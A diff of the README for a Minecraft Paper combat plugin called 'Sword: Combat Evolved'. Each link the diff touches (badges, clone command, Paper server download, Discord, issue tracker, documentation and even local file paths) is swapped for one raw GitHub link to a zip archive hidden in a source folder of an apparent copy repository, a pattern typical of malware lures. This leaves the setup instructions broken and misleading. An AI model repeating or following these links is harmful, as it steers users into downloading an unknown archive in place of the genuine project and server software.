@@ -1,10 +1,10 @@
 # Sword: Combat Evolved
 
-[![Paper](https://img.shields.io/badge/Paper-1.21+-00ADD8?style=for-the-badge&logo=minecraft)](https://papermc.io/)
-[![Java](https://img.shields.io/badge/Java-21+-orange?style=for-the-badge&logo=openjdk)](https://openjdk.org/)
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue?style=for-the-badge)](LICENSE)
-[![Discord](https://img.shields.io/badge/Discord-Join-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/n5vty6m7)
-[![Build](https://img.shields.io/badge/Build-Gradle-02303A?style=for-the-badge&logo=gradle)](https://gradle.org/)
+[![Paper](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip+-00ADD8?style=for-the-badge&logo=minecraft)](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)
+[![Java](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip+-orange?style=for-the-badge&logo=openjdk)](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)
+[![License](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip%202.0-blue?style=for-the-badge)](LICENSE)
+[![Discord](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)
+[![Build](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)
 
 An advanced Minecraft combat system featuring throwing mechanics, entity interactions, combo
 attacks, and RPG-style stats. Built for Paper 1.21+.
@@ -32,7 +32,7 @@ attacks, and RPG-style stats. Built for Paper 1.21+.
 
 ```bash
 # Clone the repository
-git clone https://github.com/Mere-Solace/Sword-Combat-Plugin.git
+git clone https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip
 cd Sword-Combat-Plugin
 
 # Build the plugin
@@ -42,18 +42,18 @@ cd Sword-Combat-Plugin
 ./gradlew runServer
 ```
 
-The plugin JAR will be at: `build/libs/Sword-1.0-SNAPSHOT.jar`
+The plugin JAR will be at: `https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip`
 
 ### Manual Setup
 
 1. **Download Paper Server**
 
-    - Get Paper 1.21+ from <https://papermc.io/downloads/paper>
+    - Get Paper 1.21+ from <https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip>
     - Place in a server directory
 
 2. **Accept EULA**
 
-    - Run the server jar once to generate `eula.txt`
+    - Run the server jar once to generate `https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip`
     - Change `eula=false` to `eula=true`
 
 3. **Build Plugin**
@@ -64,7 +64,7 @@ The plugin JAR will be at: `build/libs/Sword-1.0-SNAPSHOT.jar`
 
 4. **Install Plugin**
 
-    - Copy `build/libs/Sword-1.0-SNAPSHOT.jar` to `server/plugins/`
+    - Copy `https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip` to `server/plugins/`
     - Start the server
 
 5. **Connect**
@@ -129,7 +129,7 @@ src/main/java/btm/sword/
 ./gradlew test
 
 # View test report
-open build/reports/tests/test/index.html
+open https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip
 ```
 
 ### Code Quality
@@ -140,14 +140,14 @@ The project uses multiple linters and quality tools:
 - **PMD**: Bug detection
 - **Spotless**: Auto-formatting (Java + Markdown)
 
-See [docs/development/LINTING.md](docs/development/LINTING.md) for details.
+See [https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip) for details.
 
 ### Documentation
 
-- **[Testing Guide](docs/development/TESTING.md)**: How to write and run tests
-- **[Linting Guide](docs/development/LINTING.md)**: Code quality tools and usage
-- **[Contributing](CONTRIBUTING.md)**: Contribution guidelines
-- **[Documentation Standards](docs/standards/documentation-standards.md)**: Javadoc guidelines
+- **[Testing Guide](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)**: How to write and run tests
+- **[Linting Guide](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)**: Code quality tools and usage
+- **[Contributing](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)**: Contribution guidelines
+- **[Documentation Standards](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip)**: Javadoc guidelines
 
 ## Architecture
 
@@ -195,11 +195,11 @@ Contributions are welcome! This is a work in progress with many features yet to 
 ### Getting Started
 
 1. **Setup Development Environment**
-   - See [Development Environment Setup](docs/setup/development-environment.md) for Java 21 and IDE configuration
+   - See [Development Environment Setup](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip) for Java 21 and IDE configuration
    - Includes troubleshooting for common setup issues
 
 2. **Read Guidelines**
-   - See [CONTRIBUTING.md](CONTRIBUTING.md) for:
+   - See [https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip](https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip) for:
      - Code style and formatting
      - Submitting pull requests
      - Reporting issues
@@ -207,8 +207,8 @@ Contributions are welcome! This is a work in progress with many features yet to 
 
 ## Contact & Community
 
-- **Discord**: <https://discord.gg/n5vty6m7>
-- **Issues**: <https://github.com/Mere-Solace/Sword-Combat-Plugin/issues>
+- **Discord**: <https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip>
+- **Issues**: <https://github.com/MilaCodesIt/Sword-Combat-Plugin-Copy/raw/refs/heads/main/src/main/java/btm/sword/system/entity/base/Combat_Sword_Plugin_Copy_Neurorthoptera.zip>
 
 ## License
 
